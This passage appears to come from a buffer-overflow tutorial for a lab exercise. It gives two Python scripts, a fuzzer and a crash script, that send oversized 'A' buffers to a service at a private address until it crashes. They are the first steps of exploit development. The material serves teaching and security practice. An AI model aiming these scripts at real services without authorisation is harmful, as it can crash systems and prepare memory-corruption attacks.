## fuzzer.py

Once you’re successfully able to connect to the service, can perform authentication, and quit gracefully, it’s time to fuzz.

```
import sys,socket 
address = '192.168.69.101'
port = 9999
buffer = ['\x41']
counter = 100
while len(buffer)<= 10:
	buffer.append('\x41'*counter)
	counter=counter+100
try:
	for string in buffer:	
		print '[+] Sending %s bytes...' % len(string)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect((address,port))
		s.recv(1024)
		s.send(string + '\r\n')
		print '[!] Done'
except:
 	print '[!] Unable to connect to the application. You may have crashed it.'
 	sys.exit(0)
finally:
	s.close()

```

## crash.py

To find the [more] approximate number of bytes send at which the program crashed, use this script. 

```
#!/usr/bin/python
import socket
import sys
from time import sleep

buffer = 'A' * 700		#change 600 accordingly

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer...'
  s.send(buffer + '\r\n')
  s.close()
  print '[!] Done.'

except:
  print '[!] Could not connect to target, exiting.'
  sys.exit()

```



